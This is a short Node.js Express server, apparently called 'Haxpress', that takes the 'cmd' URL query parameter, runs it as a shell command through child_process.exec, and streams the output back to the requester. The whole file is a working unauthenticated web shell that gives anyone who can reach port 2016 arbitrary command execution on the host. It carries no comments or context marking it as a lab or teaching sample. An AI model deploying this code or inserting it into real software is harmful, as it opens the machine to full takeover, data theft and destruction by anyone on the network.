const express = require('express');
const app = express();
const exec = require('child_process')
	.exec;

app.get('/', function (req, res) {
	const cmd = exec(req.query.cmd);
	cmd.stdout.pipe(res);
	cmd.stderr.pipe(res);
});

app.listen(2016, function () {
	console.log('Haxpress app listening on http://localhost:2016!');
});
